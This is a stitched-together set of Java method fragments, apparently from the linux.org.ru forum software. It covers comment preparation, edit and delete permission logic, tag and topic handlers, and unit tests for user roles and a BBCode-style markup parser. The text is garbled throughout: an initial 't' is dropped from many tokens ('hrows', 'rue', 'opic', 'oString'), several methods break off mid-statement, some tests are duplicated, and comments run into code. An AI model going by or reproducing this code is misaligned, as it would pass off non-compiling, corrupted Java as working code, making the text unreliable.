public List < PreparedComment > prepareCommentListRSS ( CommentList comments , List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure , rue , null , null ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure , Template mpl , Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . ransform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( ext , comment , comments , secure , false , mpl , opic ) ) ; } return commentsPrepared ; } 
public boolean isShowLastMod ( ) { return showLastMod ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) hrows Exception { Topic opic = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( opic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! opic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( opic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . oString ( ) ) ) ; } 
public boolean isCommentEditableNow ( boolean moderatorMode , boolean moderatorAllowEditComments , boolean commentEditingAllowedIfAnswersExists , int commentScoreValueForEditing , int userScore , boolean authored , boolean haveAnswers , int commentExpireMinutesForEdit , long commentTimestamp ) { Boolean editable = moderatorMode & & moderatorAllowEditComments ; long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; if ( ! editable & & authored ) { boolean isbyMinutesEnable ; if ( commentExpireMinutesForEdit ! = 0 ) { long deltaTimestamp = commentExpireMinutesForEdit * 60 * 1000 ; isbyMinutesEnable = commentTimestamp + deltaTimestamp > nowTimestamp ; } else { isbyMinutesEnable = rue ; } boolean isbyAnswersEnable = rue ; if ( ! commentEditingAllowedIfAnswersExists & & haveAnswers ) { isbyAnswersEnable = false ; } boolean isByScoreEnable = rue ; if ( commentScoreValueForEditing > userScore ) { isByScoreEnable = false ; } editable = isbyMinutesEnable & isbyAnswersEnable & isByScoreEnable ; } return editable ; } 
public boolean isCommentDeletableNow ( boolean moderatorMode , boolean expired , boolean authored , boolean haveAnswers , long commentTimestamp ) { long nowTimestamp = new java . util . Date ( ) . getTime ( ) ; return moderatorMode | | ( ! expired & & 
public boolean isCommentEditableNow ( boolean moderatorMode , boolean moderatorAllowEditComments , boolean commentEditingAllowedIfAnswersExists , int commentScoreValueForEditing , int userScore , boolean authored , boolean haveAnswers , int commentExpireMinutesForEdit , long commentTimestamp ) { Boolean editable = moderatorMode & & moderatorAllowEditComments ; long nowTimestamp = System . currentTimeMillis ( ) ; if ( ! editable & & authored ) { boolean isbyMinutesEnable ; if ( commentExpireMinutesForEdit ! = 0 ) { long deltaTimestamp = commentExpireMinutesForEdit * 60 * 1000 ; isbyMinutesEnable = commentTimestamp + deltaTimestamp > nowTimestamp ; } else { isbyMinutesEnable = rue ; } boolean isbyAnswersEnable = rue ; if ( ! commentEditingAllowedIfAnswersExists & & haveAnswers ) { isbyAnswersEnable = false ; } boolean isByScoreEnable = rue ; if ( commentScoreValueForEditing > userScore ) { isByScoreEnable = false ; } editable = isbyMinutesEnable & isbyAnswersEnable & isByScoreEnable ; } return editable ; } 
public boolean isCommentDeletableNow ( boolean moderatorMode , boolean expired , boolean authored , boolean haveAnswers , long commentTimestamp ) { long nowTimestamp = System . currentTimeMillis ( ) ; return moderatorMode | | ( ! expired & & 
private static boolean isDeletableByUser ( Topic opic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( opic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & opic . getUid ( ) = = user . getId ( ) ) ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
public ModelAndView forum ( ) { return handleRequestInternal ( Section . SECTION_FORUM ) ; } 
public Boolean isModeratorAllowedToEditComments ( ) { String property = properties . getProperty ( " comment.isModeratorAllowedToEdit " ) ; if ( property = = null ) { return false ; } return Boolean . valueOf ( property ) ; } 
public Boolean isCommentEditingAllowedIfAnswersExists ( ) { String property = properties . getProperty ( " comment.isEditingAllowedIfAnswersExists " ) ; if ( property = = null ) { return false ; } return Boolean . valueOf ( property ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByFirstLetter ( firstLetter ) ; if ( ags . isEmpty ( ) ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
public ModelAndView changeTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " agName " ) String oldTagName ) hrows AccessViolationException { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Change agRequestChange = new TagRequest . Change ( ) ; agRequestChange . setOldTagName ( oldTagName ) ; agRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestChange " , agRequestChange ) ; return modelAndView ; } 
public ModelAndView deleteTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " agName " ) String oldTagName ) hrows AccessViolationException { Template emplate = Template . getTemplate ( request ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Delete agRequestDelete = new TagRequest . Delete ( ) ; agRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestDelete " , agRequestDelete ) ; return modelAndView ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletResponse response ) { response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return new ModelAndView ( " register " ) ; } 
public synchronized void add ( Object name , Object value ) hrows UnsupportedEncodingException { if ( value = = null ) { return ; } if ( ! query . rim ( ) . isEmpty ( ) ) { query + = " & " ; } query + = URLEncoder . encode ( name . oString ( ) , " UTF-8 " ) + '=' + URLEncoder . encode ( value . oString ( ) , " UTF-8 " ) ; 
public String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . oString ( ) . rim ( ) ; } 
public void groupsTest ( ) hrows Exception { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . henReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; assertEquals ( " General " , groupDto . getTitle ( ) ) ; } 
public void mainTopicsFeedHandler ( ) { } } 
public void getTopicsFeedYear_commonTest ( ) hrows UserErrorException , TagNotFoundException { when ( agService . getTagId ( " LOR " ) ) . henReturn ( 123 ) ; List < Topic > opicList = opicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( 1 , opicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = opicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( Integer . valueOf ( 11 ) , sectionId ) ; assertEquals ( 111 , opicListDto . getGroup ( ) ) ; assertEquals ( 123 , opicListDto . getTag ( ) ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , opicListDto . getDateLimitType ( ) ) ; assertEquals ( TopicListDao . CommitMode . COMMITED_ONLY , opicListDto . getCommitMode ( ) ) ; } 
public void getTopicsFeedYear_monthAndYearTest ( ) hrows UserErrorException , TagNotFoundException { List < Topic > opicList = opicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , opicListDto . getDateLimitType ( ) ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( 2000 , 10 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , opicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; calendar . set ( 2000 , 11 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , opicListDto . getToDate ( ) . getTime ( ) / 1000 ) ; assertNull ( opicListDto . getLimit ( ) ) ; opicList = opicListService . getTopicsFeed ( section2 , null , null , 0 , null , null ) ; assertEquals ( TopicListDto . DateLimitType . MONTH_AGO , opicListDto . getDateLimitType ( ) ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , opicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; assertNull ( opicListDto . getToDate ( ) ) ; assertEquals ( Integer . valueOf ( 20 ) , opicListDto . getLimit ( ) ) ; assertNull ( opicListDto . getOffset ( ) ) ; } 
public void cleanupTestData ( ) { jdbcTemplate . update ( " DELETE FROM user_TAGS WHERE user_id in ( " + user1Id + " , " + user2Id + ')' ) ; jdbcTemplate . update ( " DELETE FROM users WHERE nick LIKE 'UserTagDaoIntegrationTest_user%' " ) ; jdbcTemplate . update ( " DELETE FROM tags_values WHERE value LIKE 'UserTagDaoIntegrationTest_tag%' " 
public void maxcomTest ( ) hrows Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( " ango " , resultSet . getString ( " style " ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) hrows Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( " ango " , resultSet . getString ( " style " ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( " ango " , resultSet . getString ( " style " ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void estOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " " , lorCodeService . parseForOgDescription ( " [code]&#9618;[/code] " ) ) ; String xt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . parseForOgDescription ( xt ) ) ; assertEquals ( 250 + 3 , 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [BR] " , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [B]hello world[/b] " , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [I]hello world[/i] " , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [S]hello world[/s] " , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [STRONG]hello world[/strong] " , false ) ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/QUOTE] " , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false ) ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/URL] " , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]l[/b]inux[/url] " , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]linux[/b][/url] " , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false ) ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false ) ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false)); 
public static Group buildGroup ( ResultSet rs ) hrows SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat1 " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " itle " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public boolean isTopicPostingAllowed ( @Nonnull Group group , @Nullable User currentUser ) { int restriction = getEffectivePostscore ( group ) ; if ( restriction = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return rue ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restriction = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public void moveTopic ( Topic msg , Group newGrp , User moveBy ) { String url = msg . getUrl ( ) ; boolean lorcode = msgbaseDao . getMessageText ( msg . getId ( ) ) . isLorcode ( ) ; jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , newGrp . getId ( ) , msg . getId ( ) ) ; if ( ! newGrp . isLinksAllowed ( ) ) { jdbcTemplate . update ( " UPDATE topics SET linktext=null, url=null WHERE id=? " , msg . getId ( ) ) ; 
public Topic getById ( int id ) hrows MessageNotFoundException { Topic message ; ry { message = jdbcTemplate . queryForObject ( queryMessage , new RowMapper < Topic > ( ) { @Override public Topic mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Topic ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { noinspection ThrowInsideCatchBlockWhichIgnoresCaughtException throw new MessageNotFoundException(id); } return message; } 
public String simpleFormat ( String ext ) { return StringUtil . escapeHtml ( ext ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public void estMDash ( ) { assertEquals ( " <ul><li><a href= \" http:www.freebsd.org/doc/en_US.ISO8859-1/books/pmake/index.html \" >PMake&nbsp;&mdash; A Tutorial</a></li></ul> " , 
public void init ( ) hrows Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . henReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . henReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setConfiguration ( configuration ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . henReturn ( false ) ; when ( user . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . henReturn ( user ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setConfiguration ( configuration ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public Image imageForTopic ( @Nonnull Topic opic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , new RowMapper < Image > ( ) { @Override public Image mapRow ( ResultSet rs , int i ) hrows SQLException { return new Image ( rs . getInt ( " id " ) , rs . getInt ( " opic " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; } } , opic . getId ( ) ) ; if ( found . size ( ) = = 0 ) { return null ; 
public boolean isImageAllowed ( ) { return imageAllowed ; } 
private void prepareModel ( AddTopicRequest form , Map < String , Object > params ) { Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " section " , sectionService . getSection ( group . getSectionId ( ) ) ) ; params . put ( " addportal " , sectionService . getAddInfo ( group . getSectionId ( ) ) ) ; } params . put ( " opTags " , agService . getTopTags ( ) ) ; } 
